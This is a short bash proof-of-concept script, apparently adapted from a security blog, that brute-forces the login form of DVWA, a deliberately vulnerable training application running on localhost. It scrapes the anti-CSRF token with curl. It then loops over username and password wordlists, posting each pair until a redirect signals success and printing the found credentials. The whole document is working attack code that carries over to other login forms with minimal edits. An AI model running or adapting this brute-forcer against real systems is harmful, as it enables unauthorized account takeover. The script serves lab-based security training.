#!/bin/bash
# Quick PoC template for HTTP POST form brute force, with anti-CRSF token
# Target: DVWA v1.10
#   Date: 2015-10-19
# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
# Source: https://blog.g0tmi1k.com/dvwa/login/

# view changes by ahofa, 2018

## Variables
URL="http://localhost"
### USER_LIST="/usr/share/seclists/Usernames/top_shortlist.txt"
### PASS_LIST="/usr/share/seclists/Passwords/rockyou.txt"
USER_LIST="/usr/share/metasploit-framework/data/wordlists/unix_users.txt"
PASS_LIST="/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt"

## Value to look for in response (Whitelisting)
SUCCESS="Location: index.php"

## Anti CSRF token
CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | grep  -P '[0-9a-fA-F]{32}' | cut -d "'" -f6 )"
### -c store cookies
### -s silten
### -P [0-9a-fA-F]{32}    regex Perl : 32 hex digits
### cut 6. field (contains the 32 hex digits

[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

    ## Feedback for user
    echo "[i] Try ${i}: ${_USER} // ${_PASS}"

    ## Connect to server
    REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

    ## Check response
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\n\n[i] Found!"
      echo "[i] Username: ${_USER}"
      echo "[i] Password: ${_PASS}"
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
rm -f /tmp/dvwa.cookie
